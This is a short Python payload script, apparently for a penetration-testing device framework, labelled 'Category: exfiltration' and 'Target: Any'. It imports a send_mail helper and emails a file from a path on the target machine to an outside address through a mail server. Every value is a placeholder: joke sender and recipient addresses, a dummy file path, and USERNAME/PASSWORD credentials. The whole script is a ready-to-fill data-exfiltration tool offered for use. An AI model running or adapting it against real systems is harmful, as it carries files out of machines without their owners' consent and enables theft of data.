# Title:	    Email-Sender
# Description:  Allows sending emails to a mail server, with file support
#               this is used coupled with the extension 
# Author: 	    TheDragonkeeper
# Version:	    1.0
# Category:     exfiltration
# Target: 	    Any

import sys
sys.path.append("/root/extensions")
from sendemail import send_mail

send_mail('im-just-a-squirrel@giving-you-my-nuts.net', 'EmailTo@SendTo.net',
                   'You Got My Nuts',
                   'Enjoy this package',
                   files=["/Path/To/My/Nuts.txt"],
                   server='MAIL.SERVER.com', username='USERNAME', password='PASSWORD')
